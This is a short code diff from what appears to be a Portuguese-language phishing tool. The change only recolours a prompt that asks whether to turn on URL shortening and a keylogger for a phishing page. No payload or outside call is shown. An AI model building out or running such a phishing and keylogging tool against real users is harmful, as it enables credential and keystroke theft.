@@ -1956,7 +1956,7 @@ def url_program(template_phishing,porta,url_action,encurtar_url,keylogger):
    verificar_url = "https://" in url_action
    if (verificar_url == True):
      banner_program()
-     escolha2 = str(input("\n" + W + "[" + A + G + "+" + W + "]" + C + " Deseja usar modo Encurtar URL e Keylogger? : " + A))
+     escolha2 = str(input("\n" + W + "[" + A + G + "+" + W + "]" + C + " Deseja usar modo Encurtar URL e Keylogger? : " + A + G))
      if (escolha2 == "sim" or escolha2 == "s" or escolha2 == "yes" or escolha2 == "y" or escolha2 == "SIM" or escolha2 == "YES"):
        encurtar_url = "on"
        keylogger = "on"
